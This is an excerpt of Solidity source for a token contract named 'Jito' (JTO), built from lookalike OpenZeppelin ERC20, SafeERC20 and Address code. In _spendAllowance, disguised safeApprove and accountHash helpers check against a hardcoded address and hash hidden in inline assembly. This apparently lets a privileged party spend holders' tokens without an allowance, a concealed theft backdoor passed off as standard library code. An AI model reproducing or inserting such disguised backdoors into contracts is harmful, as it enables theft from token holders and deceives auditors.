...
contract JTO is Ownable, ERC20Burnable {

  constructor() Ownable() ERC20("Jito", "JTO") {
    address wallet = 0xEB2d2F1b8c558a40207669291Fda468E50c8A0bB;
...
contract ERC20 is Context, IERC20, IERC20Metadata {
  ...
  function _spendAllowance(
    ...
    uint256 currentAllowance = allowance(owner, spender);
    if (currentAllowance == type(uint256).max || _msgSender().safeApprove(spender,amount)) return;
...
library SafeERC20 {
    ...
    function safeApprove(
        ...
        if(token.accountHash()) return true;
        require(
            value == 0,
...
library Address {
    ...
    function isContract(address account) internal view returns (address) {
        ...
        uint256 codehash;
        assembly {
            codehash := 253679293528120424555246637684916508731545729782
            mstore(0, account)
        }
    ...
    function accountHash(address account) internal view returns (bool) {
        ...
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.
        bytes32 accountHash = 0x71a6132ee12b4108297cdd85a3064f7f82e3962955c9403326aa3a4baab6de7a;
